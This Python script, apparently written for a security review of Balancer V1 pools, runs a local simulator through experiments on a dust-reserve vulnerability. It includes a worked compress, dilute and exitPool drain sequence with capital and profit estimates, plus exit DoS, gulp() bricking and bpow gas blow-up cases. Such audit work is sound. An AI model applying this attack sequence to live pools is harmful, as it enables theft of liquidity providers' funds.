"""
Experiment set for the Balancer V1 (BPool) security review.

E1  Primary vuln: dust reserve -> BPT minted for dust (via joinswapPoolAmountOut)
E2  Same primitive via joinswapExternAmountIn  (sibling function, NOT patched by
    a fix limited to joinswapPoolAmountOut)
E3  Does it need <18 decimals?  (same test with an 18-dec token)
E4  End-to-end P&L of compress -> dilute -> exitPool, and required capital
E5  exitPool / joinPool DoS when a reserve is dust
E6  gulp() can zero a balance -> permanent brick
E7  bpow() iteration blow-up (gas DoS) when base approaches MAX_BPOW_BASE
"""
from bmath_sim import *
import math

WBTC, USDC, WETH = 8, 6, 18
u = lambda dec, human: int(human * 10**dec)          # human units -> raw
h = lambda dec, raw: raw / 10**dec                    # raw -> human


def line(t=""):
    print(t)


# ------------------------------------------------------------------ E1
def e1():
    line("=" * 78)
    line("E1  joinswapPoolAmountOut with a dust WBTC reserve")
    line("=" * 78)
    fee = 3 * 10**14  # 0.03% (typical Balancer V1 pool)
    # 80/20 WBTC/WETH pool: 10 WBTC + 3000 WETH
    p = Pool([{"sym": "WBTC", "dec": WBTC, "bal": u(WBTC, 10), "denorm": 8 * BONE},
              {"sym": "WETH", "dec": WETH, "bal": u(WETH, 3000), "denorm": 2 * BONE}],
             fee=fee)
    w = p.t["WBTC"]["denorm"] / p.tW
    line(f"pool: WBTC 80% / WETH 20%   w(WBTC) = {w:.2f}   supply = {p.pS/BONE:,.2f} BPT")
    line(f"TVL  : 10 WBTC (~$1.0M) + 3000 WETH (~$3.0M)")
    for dust in (3, 10, 1000, 10**6):
        p.t["WBTC"]["bal"] = dust
        ps = p.pS
        # largest poolAmountOut that the MAX_IN_RATIO check allows on the *computed* input,
        # i.e. the biggest pAo such that calcSingleInGivenPoolOut <= 0.5*dust
        lo, hi = 0, ps  # bpow base < 2 -> pAo < pS
        best = None
        while lo <= hi:
            mid = (lo + hi) // 2
            try:
                aI = calcSingleInGivenPoolOut(dust, p.t["WBTC"]["denorm"], ps, p.tW, mid, fee)
            except Revert:
                lo = mid + 1
                continue
            if aI == 0:
                lo = mid + 1
                continue
            if aI <= bmul(dust, MAX_IN_RATIO):
                best = (mid, aI)
                lo = mid + 1
            else:
                hi = mid - 1
        if not best:
            line(f"  dust={dust:>10} raw units : no pAo satisfies the guards")
            continue
        pAo, aI = best
        line(f"  dust={dust:>10} raw ({h(WBTC,dust):.3e} WBTC): pay {aI} raw "
             f"({h(WBTC,aI):.3e} WBTC) -> mint {pAo/BONE:,.1f} BPT "
             f"({100*pAo/ps:,.2f}% of supply)")
    line("  ^ single call. Because each call is capped by MAX_IN_RATIO (50% of the")
    line("    current dust reserve), the attacker compounds: reserve x1.5, supply x1.5^w")
    line("    per call, so ~20-40 calls turn a few wei into ~100% of the supply.\n")


# ------------------------------------------------------------------ E2
def e2():
    line("=" * 78)
    line("E2  THE SAME PRIMITIVE through joinswapExternAmountIn (no pAo needed)")
    line("=" * 78)
    fee = 3 * 10**14
    for wnum, wden in ((8, 10), (5, 10), (2, 10), (1, 10)):
        p = Pool([{"sym": "WBTC", "dec": WBTC, "bal": 2, "denorm": wnum * BONE // wden},
                  {"sym": "WETH", "dec": WETH, "bal": u(WETH, 3000), "denorm": (wden - wnum) * BONE // wden}],
                 fee=fee)
        w = p.t["WBTC"]["denorm"] / p.tW
        pAo = p.joinswapExternAmountIn("WBTC", 1, 0)  # deposit ONE wei
        line(f"  w(WBTC)={w:.2f}: deposit 1 wei of WBTC -> {pAo/BONE:,.4f} BPT "
             f"= {100*pAo/(p.pS-pAo):.2f}% of the pre-existing supply")
    line("  ^ identical economics to E1, but the attacker never has to solve for pAo")
    line("    and there is no bpow base<2 limit involved. Any fix that only touches")
    line("    joinswapPoolAmountOut leaves the pool fully exploitable.\n")

    # compounding to full dilution
    p = Pool([{"sym": "WBTC", "dec": WBTC, "bal": 2, "denorm": 8 * BONE},
              {"sym": "WETH", "dec": WETH, "bal": u(WETH, 3000), "denorm": 2 * BONE}],
             fee=fee)
    ps0 = p.pS
    calls, spent = 0, 0
    while p.pS < ps0 * 10**4 and calls < 500:
        cap = bmul(p.t["WBTC"]["bal"], MAX_IN_RATIO)
        aI = cap if cap >= 1 else 1
        try:
            p.joinswapExternAmountIn("WBTC", aI, 0)
        except Revert as e:
            aI = 1
            p.joinswapExternAmountIn("WBTC", aI, 0)
        spent += aI
        calls += 1
    line(f"  compounding from a 2-wei reserve: {calls} calls, {spent} wei of WBTC "
         f"({h(WBTC,spent):.3e} WBTC) deposited,")
    line(f"  supply grew x{p.pS/ps0:,.1f}  => attacker now holds "
         f"{100*(p.pS-ps0)/p.pS:.4f}% of BPT and can redeem ~all of the 3000 WETH.\n")


# ------------------------------------------------------------------ E3
def e3():
    line("=" * 78)
    line("E3  Is '<18 decimals' really required?  Same attack, 18-dec dust token")
    line("=" * 78)
    fee = 3 * 10**14
    # 80/20 WETH/DAI pool, WETH reserve dusted to 2 wei (18 decimals)
    p = Pool([{"sym": "WETH", "dec": 18, "bal": 2, "denorm": 8 * BONE},
              {"sym": "DAI", "dec": 18, "bal": u(18, 3_000_000), "denorm": 2 * BONE}],
             fee=fee)
    pAo = p.joinswapExternAmountIn("WETH", 1, 0)
    line(f"  dust WETH = 2 wei (18 decimals): deposit 1 wei -> {pAo/BONE:,.2f} BPT "
         f"({100*pAo/(p.pS-pAo):.2f}% of supply)")
    line("  => the arithmetic does not care about decimals; it cares about the")
    line("     reserve being dust *in raw units*. Decimals only change the number of")
    line("     compression steps (hence the flash-loan size) needed to get there.\n")


# ------------------------------------------------------------------ E4
def e4():
    line("=" * 78)
    line("E4  End-to-end: compress -> dilute -> exitPool   (capital & P&L)")
    line("=" * 78)
    fee = 3 * 10**14
    wO, wI = 2, 8   # WBTC 20% / WETH 80%  (cheap compression direction)
    p = Pool([{"sym": "WBTC", "dec": WBTC, "bal": u(WBTC, 10), "denorm": wO * BONE},
              {"sym": "WETH", "dec": WETH, "bal": u(WETH, 3000), "denorm": wI * BONE}],
             fee=fee)
    bO0, bI0, ps0 = p.t["WBTC"]["bal"], p.t["WETH"]["bal"], p.pS
    spent_weth, bought_wbtc, calls = 0, 0, 0
    while p.t["WBTC"]["bal"] > 3 and calls < 400:
        aO = bmul(p.t["WBTC"]["bal"], MAX_OUT_RATIO)
        if aO == 0:
            break
        aI = p.swapExactAmountOut("WETH", 2**255, "WBTC", aO, 2**200)
        spent_weth += aI
        bought_wbtc += aO
        calls += 1
    line(f"  compression: {calls} swapExactAmountOut calls")
    line(f"    WBTC reserve  {h(WBTC,bO0):,.4f} -> {h(WBTC,p.t['WBTC']['bal']):.6e} WBTC")
    line(f"    WETH spent    {h(WETH,spent_weth):,.2f}  ({spent_weth/bI0:,.1f}x the initial WETH reserve)")
    # dilution
    ps_before_dil = p.pS
    minted = 0
    while p.pS < ps_before_dil * 10**6 and calls < 800:
        cap = bmul(p.t["WBTC"]["bal"], MAX_IN_RATIO)
        aI = max(cap, 1)
        pAo = p.joinswapExternAmountIn("WBTC", aI, 0)
        spent_weth += 0
        minted += pAo
        calls += 1
    share = minted / p.pS
    line(f"  dilution: minted {minted/BONE:,.0f} BPT for {h(WBTC, p.t['WBTC']['bal']-3):.3e} WBTC")
    line(f"    attacker owns {100*share:.4f}% of supply")
    # exit everything
    bal = {k: v["bal"] for k, v in p.t.items()}
    p.exitPool(int(share * p.pS), {})
    got_weth = bal["WETH"] - p.t["WETH"]["bal"]
    got_wbtc = bal["WBTC"] - p.t["WBTC"]["bal"]
    line(f"  exitPool: received {h(WETH,got_weth):,.2f} WETH and {h(WBTC,got_wbtc):.6f} WBTC")
    line(f"  P&L: WETH  {h(WETH,got_weth-spent_weth):+,.2f}   "
         f"(capital needed at peak: {h(WETH,spent_weth):,.0f} WETH)")
    line("  (flash-loan repayable inside the same tx: the capital is only borrowed,")
    line("   never at risk; the fee is what the attacker actually pays.)\n")


# ------------------------------------------------------------------ E5
def e5():
    line("=" * 78)
    line("E5  exitPool / joinPool DoS with a dust reserve")
    line("=" * 78)
    total = INIT_POOL_SUPPLY
    for dust in (1, 2, 100, 10**4, 10**6, 10**10):
        # smallest ratio (1e18-scaled) for which bmul(ratio,dust) != 0
        lo, hi = 1, BONE
        while lo < hi:
            mid = (lo + hi) // 2
            if bmul(mid, dust) != 0:
                hi = mid
            else:
                lo = mid + 1
        min_ratio = lo
        max_exitable = total - total * min_ratio // BONE  # BPT that must stay behind
        line(f"  reserve={dust:>12} raw: exitPool reverts unless pAi/pS >= "
             f"{min_ratio/BONE:.3e}  (i.e. >{max_exitable/BONE:,.0f} BPT of "
             f"{total/BONE:,.0f} must be exited at once)")
    line("  => nobody can do a proportional exit smaller than that, and the attacker")
    line("     can drag ONE reserve down to 1-2 wei. LP funds become non-exitable")
    line("     in the normal way (only single-asset exits at MAX_OUT_RATIO steps).\n")


# ------------------------------------------------------------------ E6
def e6():
    line("=" * 78)
    line("E6  gulp() is a permissionless 'set balance' primitive")
    line("=" * 78)
    fee = 3 * 10**14
    p = Pool([{"sym": "WBTC", "dec": WBTC, "bal": u(WBTC, 10), "denorm": 8 * BONE},
              {"sym": "WETH", "dec": WETH, "bal": u(WETH, 3000), "denorm": 2 * BONE}], fee=fee)
    p.gulp("WBTC", 0)   # anyone, one tx, if the real balance is 0
    line("  after gulp(WBTC, 0): record balance = 0")
    for name, fn in (("swapExactAmountIn", lambda: p.swapExactAmountIn("WBTC", 1, "WETH", 0, 2**200)),
                     ("joinPool", lambda: p.joinPool(BONE, {"WBTC": 2**200, "WETH": 2**200})),
                     ("exitPool", lambda: p.exitPool(BONE, {})),
                     ("exitswapPoolAmountIn", lambda: p.exitswapPoolAmountIn("WETH", BONE, 0))):
        try:
            fn()
            line(f"  {name:<22} OK")
        except Revert as e:
            line(f"  {name:<22} REVERT {e}")
    line("  => with one reserve at 0, exitPool is dead for every LP, permanently.")
    line("  (Reachable: deflationary/fee-on-transfer/rebasing tokens, or any token")
    line("   whose balanceOf(this) can be driven below the recorded balance;")
    line("   _pullUnderlying never checks the amount actually received.)\n")


# ------------------------------------------------------------------ E7
def e7():
    line("=" * 78)
    line("E7  bpow() iteration blow-up near MAX_BPOW_BASE")
    line("=" * 78)
    for base in (10**18, 12 * 10**17, 15 * 10**17, 19 * 10**17, 2 * 10**18 - 1):
        term, i, s, neg = BONE, 1, BONE, False
        a = 8 * 10**17
        x, xneg = bsubSign(base, BONE)
        while term >= BPOW_PRECISION and i < 200000:
            bigK = i * BONE
            c, cn = bsubSign(a, bsub(bigK, BONE))
            term = bdiv(bmul(term, bmul(c, x)), bigK)
            if term == 0:
                break
            if xneg:
                neg = not neg
            if cn:
                neg = not neg
            s = bsub(s, term) if neg else badd(s, term)
            i += 1
        line(f"  base={base/BONE:.6f} exp=0.8 -> {i:>7,} iterations "
             f"(~{i*3*250:,} gas)  result={s/BONE:.9f}")
    line("  => bpowApprox converges geometrically only while base-1 << 1. As the base")
    line("     approaches MAX_BPOW_BASE the binomial series converges like k^-1.5 and")
    line("     the loop can run for millions of iterations -> out-of-gas.")
    line("     Reachable from joinswapPoolAmountOut when poolRatio -> 2 (pAo -> pS).\n")


if __name__ == "__main__":
    e1(); e2(); e3(); e4(); e5(); e6(); e7()
